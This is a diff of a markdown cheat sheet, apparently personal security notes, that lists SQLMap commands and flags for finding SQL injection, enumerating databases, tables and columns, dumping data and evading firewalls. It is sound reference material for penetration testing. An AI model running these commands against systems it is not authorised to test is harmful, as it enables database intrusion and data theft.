@@ -3,21 +3,26 @@ tags:
   - security
   - sqli
   - web
-title: Fully Automated Tool (SQLMap)
+title: SQLMap
 date: 2024-01-28 14:15:56 -0600
-updated: 2024-01-28 14:15:56 -0600
+updated: 2024-03-29 23:31:52 -0500
 ---
 
 ````bash
-sqlmap -hh # Extended Help
+# Extended Help
+sqlmap -hh
 ````
 
-#### Check site for Vulnerability
+#### Test Website for Vulnerability
 
 ````bash
-sqlmap -u <URL> --level=5 --risk=3
-sqlmap -r <request-file> --string="<text-if-query-true>" --level=5 --risk=3
-sqlmap -u <URL>?id=5
+# Increase Aggressiveness of Scan
+sqlmap -u "<URL>" --level=5 --risk=3
+
+sqlmap -r <request-file> --string="<text-if-query-true>"
+
+# POST Request
+sqlmap -u "<URL>" --data="user=name&password=pass" -p "user,password"
 ````
 
 Sometimes this might not work in that case we need to specify the fields that need to be tested
@@ -28,15 +33,16 @@ e.g.  `username=*&password=*` : Save as file
 sqlmap -r <request-file>
 ````
 
-#### Retrieve DB Names
+#### Retrieve Database Names
 
 ````bash
-sqlmap -r <request-file> --dbs
 sqlmap -u <URL> --dbs
-sqlmap -u <URL> --current-dbs # Return DB that is currently used
+
+# Return DB that is currently used
+sqlmap -u <URL> --current-dbs
 ````
 
-#### All Tables from DB
+#### All Tables from Database
 
 ````bash
 sqlmap -u <URL> -D <db-name> --tables
@@ -54,16 +60,15 @@ sqlmap -u <URL> -D <db-name> -T <table-name> --columns
 sqlmap -u <URL> -D <db-name> -T <table-name> -C <column-name>
 ````
 
-#### SQLMapFlags
-
+**Flags**  
 `-u URL`: Target URL  
-`--level=5`: Through Scan - Default : 1  
-`--risk=3`: Risk Level - Default : 1  
+`--level=5`: Through Scan (Default : 1)  
+`--risk=3`: Risk Level (Default : 1)  
 `-r filename`: Provide the request file  
 `--random-agent`: Request blocked by firewall  
 `--dump`: Exploit Vulnerability Save result to file
 
-`--string "string"`: String present on result page on successful query (Required from Blind Injection)  
+`--string "string"`: String present on result page (Required for Blind Injection)  
 `--dbms=dbms-name`: Pass Database Type (MySQL, PostgreSQL, etc.)
 
 `--technique` : BEUSTQ  
